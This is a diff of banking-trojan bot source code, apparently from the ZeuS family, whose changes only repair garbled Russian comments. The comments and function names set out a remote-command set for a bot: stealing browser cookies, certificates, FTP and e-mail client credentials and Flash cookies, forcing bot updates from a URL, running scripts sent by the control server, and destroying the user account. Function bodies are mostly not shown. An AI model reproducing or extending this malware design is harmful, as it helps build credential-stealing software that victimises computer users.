@@ -30,21 +30,21 @@
 #include "..\common\comlibrary.h"
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Tools.
+//В Tools.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  РћРїРµСЂР°С†РёРё СЃРѕ СЃРїРёСЃРєР°РјРё HttpGrabber'Р°.
+  Операции со списками HttpGrabber'а.
 
   IN listId         - LocalConfig::ITEM_URLLIST_*.
-  IN add            - true - РґРѕР±Р°РІР»РµРЅРёРµ СЌР»РµРјРµРЅС‚РѕРІ РІ СЃРїРёСЃРѕРє,
-                      false - СѓРґР°Р»РµРЅРёРµ СЌР»РµРјРµРЅС‚РѕРІ РёР· СЃРїРёСЃРєР°.
-  IN arguments      - Р°СЂРіСѓРјРµРЅС‚С‹.
-  IN argumentsCount - РєРѕР». Р°СЂРіСѓРјРµРЅС‚РѕРІ.
+  IN add            - true - добавление элементов в список,
+                      false - удаление элементов из списка.
+  IN arguments      - аргументы.
+  IN argumentsCount - кол. аргументов.
 
-  Return            - true - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                      false - РІ СЃР»СѓС‡Р°Рё РѕС€РёР±РєРё.
+  Return            - true - в случаи успеха,
+                      false - в случаи ошибки.
 */
 static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -85,7 +85,7 @@ static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *argum
 #endif
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Team.
+//В Team.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 enum
 {
@@ -99,7 +99,7 @@ enum
 static DWORD pendingFlags;
 
 /*
-  Р’С‹РєР»СЋС‡РµРЅРёРµ РєРѕРјРїСЊСЋС‚РµСЂР°, РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ РґРѕР»Р¶РµРЅ РѕР±Р»Р°РґР°С‚СЊ РїСЂР°РІР°РјРё РґР»СЏ СЌС‚РѕР№ РѕРїРµСЂР°С†РёРё.
+  Выключение компьютера, пользователь должен обладать правами для этой операции.
 */
 static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -108,7 +108,7 @@ static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РџРµСЂРµР·Р°РіСЂСѓР·РєР° РєРѕРјРїСЊСЋС‚РµСЂР°, РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ РґРѕР»Р¶РµРЅ РѕР±Р»Р°РґР°С‚СЊ РїСЂР°РІР°РјРё РґР»СЏ СЌС‚РѕР№ РѕРїРµСЂР°С†РёРё.
+  Перезагрузка компьютера, пользователь должен обладать правами для этой операции.
 */
 static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -117,7 +117,7 @@ static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РЈРґР°Р»РµРЅРёРµ Р±РѕС‚Р° СЃ С‚РµРєСѓС‰РµРіРѕ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
+  Удаление бота с текущего пользователя.
 */
 static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -126,8 +126,8 @@ static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РќРµРјРµРґР»РµРЅРЅРѕРµ РѕР±РЅРѕРІР»РµРЅРёРµ С„Р°Р№Р»Р° РєРѕРЅС„РёРіСѓСЂР°С†РёРё. Р•СЃР»Рё РєР°Р·Р°РЅР° URL, С‚Рѕ РѕР±РЅРѕРІР»РµРЅРёРµ РїСЂРѕРёР·РѕР№РґРµС‚ СЃ СѓРєР°Р·Р°РЅРѕР№
-  URL, Рё С‚Р°РєР¶РµР±СѓРґРµРёС‚ РїСЂРёРЅСѓРґРёС‚РµР»СЊРЅРѕ Р·Р°РїСѓС€РµРЅ Р±РѕС‚-С„Р°Р№Р» РѕР±РЅРІРѕР»РµРЅРёСЏ СѓРєР°Р·Р°РЅС‹Р№ РІ Р·Р°РіСЂСѓР¶Р°РµРјРѕР№ РєРѕРЅС„РёРіСѓСЂР°С†РёРё.
+  Немедленное обновление файла конфигурации. Если казана URL, то обновление произойдет с указаной
+  URL, и такжебудеит принудительно запушен бот-файл обнволения указаный в загружаемой конфигурации.
 */
 static bool botUpdate(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -207,7 +207,7 @@ static bool fsSearchRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РЈРЅРёС‡С‚РѕР¶РµРЅРёРµ С‚РµРєСѓС‰РµРіРѕ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
+  Уничтожение текущего пользователя.
 */
 static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -216,7 +216,7 @@ static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  Р—Р°РІРµСЂС€РµРЅРёРµ С‚РµРєСѓС‰РµР№ СЃРµСЃСЃРёРё РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
+  Завершение текущей сессии пользователя.
 */
 static bool userLogoff(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -302,7 +302,7 @@ static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  РџРѕР»СѓС‡РµРЅРёРµ РєСѓРєРѕРІ РёР·РІРµСЃС‚РЅС‹С… Р±СЂР°СѓР·РµСЂРѕРІ.
+  Получение куков известных браузеров.
 */
 static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -316,7 +316,7 @@ static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РЈРґР°Р»РµРЅРёРµ РєСѓРєРѕРІ РёР·РІРµСЃС‚РЅС‹С… Р±СЂР°СѓР·РµСЂРѕРІ.
+  Удаление куков известных браузеров.
 */
 static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -331,7 +331,7 @@ static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  РЎРѕС…СЂР°РЅРµРЅРёРµ СЃРµСЂРёС‚РёС„Р°С‚РѕРІ РёР· MY.
+  Сохранение серитифатов из MY.
 */
 static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -339,7 +339,7 @@ static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РЈРґР°Р»РµРЅРёРµ СЃРµСЂРёС‚РёС„РєР°С‚РѕРІ РёР· MY.
+  Удаление серитифкатов из MY.
 */
 static bool userCertsRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -360,7 +360,7 @@ static bool userUrlUnblock(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_WININET > 0 || BO_NSPR4 > 0)
 /*
-  РЈСЃС‚Р°РЅРѕРІРєР° РґРѕРјР°С€РЅРёС… СЃС‚СЂР°РЅРёС†С‹ РґР»СЏ РІСЃРµС… РїРѕРґРґРµСЂР¶РёРІР°РµРјС‹С… Р±СЂР°СѓР·РµСЂРѕРІ.
+  Установка домашних страницы для всех поддерживаемых браузеров.
 */
 static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -374,7 +374,7 @@ static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_FTP > 0)
 /*
-  РџРѕР»СѓС‡РµРЅРёРµ РґР°РЅРЅС‹С… FTP-РєР»РёРµРЅС‚РѕРІ.
+  Получение данных FTP-клиентов.
 */
 static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -391,7 +391,7 @@ static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 
 #if(BO_SOFTWARE_EMAIL > 0)
 /*
-  РџРѕР»СѓС‡РµРЅРёРµ РґР°РЅРЅС‹С… E-mail-РєР»РёРµРЅС‚РѕРІ.
+  Получение данных E-mail-клиентов.
 */
 static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -407,7 +407,7 @@ static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
 #endif
 
 /*
-  РџРѕР»СѓС‡РµРЅРёРµ РєСѓРєРѕРІ С„Р»РµС€-РїР»РµРµСЂР°.
+  Получение куков флеш-плеера.
 */
 static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -416,7 +416,7 @@ static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РЈРґР°Р»РµРЅРёРµ РєСѓРєРѕРІ С„Р»РµС€-РїР»РµРµСЂР°.
+  Удаление куков флеш-плеера.
 */
 static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 {
@@ -425,7 +425,7 @@ static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
 }
 
 /*
-  РСЃРїРѕР»РЅРµРЅРёРµ РєРѕРјР°РЅРґ, РєРѕС‚РѕСЂС‹Рµ РґРѕР»Р¶РЅС‹ РёСЃРїРѕР»РЅРёС‚СЊСЃСЏ РїРѕСЃР»Рµ РѕС‚РїСЂР°РІРєРё РѕС‚РІРµС‚Р° СЃРµСЂРІРµСЂСѓ.
+  Исполнение команд, которые должны исполниться после отправки ответа серверу.
 */
 static void executePendingCommands(void)
 {
@@ -457,7 +457,7 @@ static void executePendingCommands(void)
 }
 
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
-//Р’В Command structure.
+//В Command structure.
 //////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef bool (*COMMANDPROC)(const LPWSTR *arguments, DWORD argumentsCount);
@@ -571,12 +571,12 @@ static int resultProc(DWORD loop, Report::SERVERSESSION *session)
 }
 
 /*
-  РџСЂРѕРІРµСЂРєР° СЃС‚Р°С‚СѓСЃ СЃРєСЂРёРїС‚Р°.
+  Проверка статус скрипта.
 
-  IN hash - MD5 С…СЌС€ СЃРєСЂРёРїС‚Р°.
+  IN hash - MD5 хэш скрипта.
 
-  Return  - 0 - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-            CryptedStrings::id_* - РІ СЃР»СѓС‡Р°Рё РїСЂРѕРІР°Р»Р°.
+  Return  - 0 - в случаи успеха,
+            CryptedStrings::id_* - в случаи провала.
 */
 static WORD getScriptStatusByHash(LPBYTE hash)
 {
@@ -642,11 +642,11 @@ static WORD getScriptStatusByHash(LPBYTE hash)
 /*
   Execution of the script.
 
-  IN scriptText - С‚РµРєСЃС‚ СЃРєСЂРёРїС‚Р°.
-  OUT errorLine - СЃС‚СЂРѕРєР° РЅР° РєРѕС‚СЂРѕС‹Р№ РїСЂРѕРёР·РѕС€Р»Р° РѕС€РёР±РєР°, РёР»Рё (DWORD)-1 РµСЃР»Рё РѕС€РёСЋРєР° РїСЂРѕРёР·РѕС€Р»Р° РЅРµ РЅР°
-                  СЃС‚СЂРѕРєРµ.
-  Return        - 0 - РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС…Р°,
-                  CryptedStrings::id_* - СЃР»СѓС‡Р°Рё РїСЂРѕРІР°Р»Р°.
+  IN scriptText - текст скрипта.
+  OUT errorLine - строка на котроый произошла ошибка, или (DWORD)-1 если ошиюка произошла не на
+                  строке.
+  Return        - 0 - в случаи успеха,
+                  CryptedStrings::id_* - случаи провала.
 */
 static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
 {
@@ -718,11 +718,11 @@ static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
   return errorMessageId;
 }
 
-/*Р’В Р’В The entry point for processing the script.
+/*В В The entry point for processing the script.
 
-Р’В Р’В IN p - BinStorage:: STORAGE.
+В В IN p - BinStorage:: STORAGE.
 
-Р’В Р’В Return - 0.*/
+В В Return - 0.*/
 static DWORD WINAPI scriptProc(void *p)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
